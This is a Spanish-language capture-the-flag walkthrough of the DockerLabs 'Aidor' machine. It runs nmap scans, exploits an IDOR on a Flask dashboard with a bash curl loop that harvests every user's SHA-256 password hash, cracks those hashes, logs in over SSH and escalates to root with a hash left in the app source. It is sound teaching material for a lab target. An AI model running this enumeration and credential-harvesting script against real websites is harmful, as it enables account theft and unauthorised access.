![Screenshot](/easy/Aidor/Images/machine.png)

Dificultad: **fácil**

Hecho por: **el pinguino de mario**

# Pasos para pwnear 🥽

* 👁️  [Reconocimiento](#reconocimiento)
* 🪓 [Explotación](#explotación)
* 🚩 [Escalación De Privilegios](#escalación-de-privilegios)

---

Primero aseguramos que la máquina esté encendida, podemos hacerlo con el comando **ping**

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/facil/aidor]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.271 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.292 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.110 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2037ms
rtt min/avg/max/mdev = 0.110/0.224/0.292/0.081 ms
```

Una vez que lo vemos, podemos comenzar la fase de **reconocimiento**.

---
# Reconocimiento

Hacemos nuestro primer escaneo con **nmap** para descubrir qué puertos están abiertos en el objetivo.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/facil/aidor]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-18 01:53 -05
Initiating ARP Ping Scan at 01:53
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 01:53, 0.16s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 01:53
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 5000/tcp on 172.17.0.2
Completed SYN Stealth Scan at 01:53, 3.83s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000029s latency).
Scanned at 2025-11-18 01:53:30 -05 for 4s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.27 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- Con este argumento le decimos a nmap que escanee todos los puertos, desde el puerto 1, hasta el puerto 65,535.

**-n** <- Con este argumento nmap saltará la resolución DNS, esto es porque a veces en nuestros escaneos esto puede ser muy lento.

**-sS** <- Con este argumento nmap hará un escaneo stealth, esto significa que no se completará el 3-way-handshake, y también hará el escaneo un poco más rápido.

**--min-rate 5000** <- Con este argumento nmap enviará al menos 5000 paquetes por segundo, haciendo el escaneo aún más rápido.

**-Pn** <- Con este argumento nmap también saltará la fase de descubrimiento del host, esto significa que nmap tratará la máquina como activa y hará el escaneo inmediatamente.

**-vv** <- Con este argumento nmap nos mostrará los puertos abiertos descubiertos mientras el escaneo continúa, esto significa que si nmap descubre un puerto abierto, inmediatamente nos lo reportará mientras el escaneo continúa.

**--open** <- Con este argumento le estamos diciendo a nmap que solo filtre los puertos abiertos.

Una vez que el escaneo concluye podemos ver 2 puertos abiertos:

- puerto 22 (ssh / secure shell)
- puerto 5000 *(upnp?)*

Podemos hacer otro escaneo con nmap para conocer más sobre estos 2 puertos.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/facil/aidor]
└─$ nmap -p22,5000 -sCV 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-18 01:59 -05
Nmap scan report for 172.17.0.2
Host is up (0.00010s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
5000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.13.5)
|_http-server-header: Werkzeug/3.1.3 Python/3.13.5
|_http-title: Iniciar Sesi\xC3\xB3n
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds
```

**-p22,5000** <- Con este argumento nmap solo escaneará estos 2 puertos que descubrimos.

**-sCV** <- Con este argumento nmap escaneará por cada puerto su versión para encontrar posibles vulnerabilidades en sistemas no actualizados, y también hará un escaneo con algunos scripts que ejecuta nmap, para encontrar más sobre estos puertos.

Una vez que el escaneo termina podemos ver que el puerto 5000 es un sitio web, veamoslo con el navegador.

![Screenshot](/easy/Aidor/Images/image1.png)

Podemos ver aquí una página de inicio de sesión, intenté ver si es vulnerable a XSS o a SQLI, pero no funcionó.

Intentemos crear un nuevo usuario.

![Screenshot](/easy/Aidor/Images/image2.png)

Podemos ver aquí un panel, pero no podemos hacer nada aquí, voy a intentar cambiar el id de la url y veamos qué pasa...

![Screenshot](/easy/Aidor/Images/image3.png)

Cambiamos exitosamente a otro usuario, podemos hacer algunos fuzzing para intentar ver qué otros usuarios posibles hay:

Primero creamos un diccionario de números comenzando con el número 1, hasta el número 100.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/facil/aidor]
└─$ seq 1 100 >> numbers.txt
```

Guardamos todos estos números en este archivo txt.

---
# Explotación

Ahora podemos comenzar a hacer algo de fuzzing...

![Screenshot](/easy/Aidor/Images/image4.png)

Podemos ver muchos resultados aquí!

Solo estoy pensando en hacer un script bash... para intentar obtener todos los usuarios del sitio web y también obtener los hashes de todos los usuarios...

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/facil/aidor]
└─$ curl -s "http://172.17.0.2:5000/dashboard?id=23" | html2text
****** DASHBOARD ******
    * Inicio
    * Perfil
    * Estadísticas
    * Configuración
    * Notificaciones
    * Mensajes
    * Reportes
ID de Usuario
#23
***** Bienvenido, rafael.dominguez *****
Último acceso: Recientemente
Cerrar Sesión
**** Rendimiento ****
94.5%
**** Tareas Completadas ****
28/36
**** Notificaciones ****
12
**** Eventos Próximos ****
5
Información del Perfil
Nombre de Usuario rafael.dominguez
Correo Electrónico rafael.dominguez@example.com
ID de Usuario 23
Estado de Cuenta Activa
Cambiar Contraseña
Contraseña Actual (Hash):
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[********************]
Actualizar Contraseña
Actividad Reciente
    * Inicio de sesión exitoso
      Hace unos momentos
    * Perfil actualizado
      Hace 2 días
    * Contraseña cambiada
      Hace 1 semana
```

Para hacer el output más legible podemos usar **html2text** es mucho más limpio y útil, podemos ver el usuario y también el Hash...

Voy a hacer un script bash para extraer todos los usuarios posibles y los hashes por cada usuario...

```
#!/bin/bash

for num in {1..100}; do
        get_content=$(curl -s "http://172.17.0.2:5000/dashboard?id=$num" | html2text)
        user=$(echo "$get_content" | awk '/Nombre de Usuario/ {print $NF}')
        hash=$(echo "$get_content" | grep -o '[a-f0-9]\{64\}')

        if [[ -n $user && -n $hash ]]; then
                echo "$user:$hash" >> credentials
        fi
done

echo "[+] All credentials are saved!"
```

Con este script estamos haciendo un bucle, comenzando con el número 1 al número 100.

Y por cada número estamos extrayendo el contenido del sitio web (curl, html2text).

También estamos obteniendo el usuario solo extrayendo la línea final de "Nombre de Usuario", donde está el nickname real del usuario.

Obteniendo el hash solo estamos extrayendo el patrón del hash **sha256** este hash tiene un patrón que alcanza **64 caracteres** (```grep -o [a-f0-9]\{64\}```)

Y al final estamos guardando el usuario y también el hash en un archivo (credentials) en el siguiente formato:

- **usuario:hash**

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/facil/aidor]
└─$ ./ExtractCredentials 
[+] All credentials are saved!
```

Okay, veamos ahora las credenciales.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/facil/aidor]
└─$ cat credentials 
juan.perez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
maria.garcia:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
carlos.lopez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
ana.martinez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
luis.rodriguez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
laura.gonzalez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
miguel.hernandez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
isabel.diaz:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
javier.sanchez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
elena.fernandez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
david.moreno:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
carmen.romero:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
francisco.alvarez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
patricia.gomez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
antonio.molina:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
rocio.ortiz:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
jose.serrano:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
teresa.marin:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
alejandro.navarro:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
silvia.torres:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
rafael.dominguez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
monica.ramirez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
pedro.castro:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
natalia.ortega:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
sergio.vazquez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
beatriz.iglesias:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
victor.morales:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
clara.santos:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
angel.cortes:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
lucia.guerrero:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
oscar.flores:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
irene.medina:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
ruben.suarez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
veronica.delgado:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
manuel.herrera:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
eva.mendez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
alberto.cruz:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
celia.aguilar:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
daniel.vidal:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
marina.prieto:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
adrian.campos:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
sandra.leon:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
marcos.rivera:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
lorena.arias:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
jordi.pascual:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
noelia.benitez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
guillermo.vicente:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
raquel.mora:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
pingu:dd0284ae23bfe3ed87de34568afa73e03380b7990fcb69b2d11cc902eb1060a3
pepe:7c9e7c1494b2684ab7c19d6aff737e460fa9e98d5a234da1310c97ddf5691834
aidor:7499aced43869b27f505701e4edc737f0cc346add1240d4ba86fbfa251e0fc35
```

Obtuvimos todas las credenciales!

Pero vemos aquí un hash que se repite una y otra vez.

- **5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8**

Este hash convertido es: **password**

Entonces filtemos este hash, para solo mostrar hashes que realmente importen.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/facil/aidor]
└─$ cat credentials | grep -v 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8

pingu:dd0284ae23bfe3ed87de34568afa73e03380b7990fcb69b2d11cc902eb1060a3
pepe:7c9e7c1494b2684ab7c19d6aff737e460fa9e98d5a234da1310c97ddf5691834
aidor:7499aced43869b27f505701e4edc737f0cc346add1240d4ba86fbfa251e0fc35
```

Vemos aquí 3 usuarios con hashes diferentes.

Convertamos estos 3 hashes.

**Nota**: Personalmente uso primero **crackstation.net** antes de hacer un ataque de fuerza bruta con mi propia computadora.

- 1er Hash: **pingu**
- 2do Hash: **pepe**
- 3er Hash: **chocolate**

Intentemos iniciar sesión con estos usuarios a través de **ssh**...

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/facil/aidor]
└─$ ssh aidor@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:iGG7GiEEPe1NGwC9/nIG97yidxpwEdFa5IPMRp5UUOI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
aidor@172.17.0.2's password: 
Linux 78dee72d97d4 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
aidor@78dee72d97d4:~$
```

Iniciamos sesión como el usuario **aidor** y su contraseña es **chocolate**!

---
# Escalación de privilegios

Podemos intentar ver algunos procesos que se están ejecutando en segundo plano:

```
aidor@78dee72d97d4:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2688  1816 ?        Ss   22:07   0:00 /bin/sh -c service ssh start && python3 app.py &&
root          16  0.0  0.1  11780  5400 ?        Ss   22:07   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 start
root          17  0.0  1.0  44560 35776 ?        S    22:07   0:00 python3 app.py
root          18  0.3  1.0 192116 37204 ?        Sl   22:07   0:03 /usr/bin/python3 app.py
root         120  0.0  0.3  19884 13224 ?        Ss   22:20   0:00 sshd-session: aidor [priv]
aidor        128  0.3  0.2  19848  7628 ?        S    22:20   0:00 sshd-session: aidor@pts/0
aidor        129  0.0  0.1   4340  3748 pts/0    Ss   22:20   0:00 -bash
aidor        142  0.0  0.1   6404  3872 pts/0    R+   22:24   0:00 ps aux
```

Podemos ver aquí que el usuario **root** está ejecutando un script de python (**app.py**)

Intentemos encontrar donde está este archivo.

```
aidor@78dee72d97d4:~$ find / -name app.py 2>/dev/null
/usr/lib/python3/dist-packages/flask/app.py
/usr/lib/python3/dist-packages/flask/sansio/app.py
/home/app.py
```

Encontramos la ubicación del archivo de python.

Veamos dentro de este script.

```
aidor@78dee72d97d4:~$ head -n 50 /home/app.py 
from flask import Flask, render_template, request, redirect, url_for, session, flash
import sqlite3
import hashlib
import os

app = Flask(__name__)
app.secret_key = 'my_secret_key'

# Ruta para conectar a la base de datos
def get_db():
    conn = sqlite3.connect('database.db')
    return conn

# Crear la base de datos y la tabla si no existen
def create_db():
    if not os.path.exists('database.db'):
        conn = get_db()
        cursor = conn.cursor()
        # Crear la tabla de usuarios si no existe
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL UNIQUE,
            password TEXT NOT NULL,
            email TEXT NOT NULL
        )
        ''')
        # Insertar un usuario de ejemplo si la tabla está vacía
        cursor.execute('SELECT COUNT(*) FROM users')
        count = cursor.fetchone()[0]
        # if count == 0:
        #     cursor.execute('''
        #     INSERT INTO users (username, password, email) VALUES
        #     ('root', 'aa87ddc5b4c24406d26ddad771ef44b0', 'admin@example.com')
        #     ''')  # La contraseña "admin" es hash SHA-256
        conn.commit()
        conn.close()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        # Hash de la contraseña
        hashed_password = hashlib.sha256(password.encode()).hexdigest()

        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM users WHERE username=? AND password=?', (username, hashed_password))
```

Aquí podemos ver un **hash** del usuario **root**

 - **aa87ddc5b4c24406d26ddad771ef44b0**

Intentemos convertirlo:

- **estrella**

Ahora intentemos iniciar sesión como el usuario **root** con esta contraseña.

```
aidor@78dee72d97d4:~$ su root
Password: 
root@78dee72d97d4:/home/aidor# whoami
root
```

Ahora somos **root** ***...pwned...!***
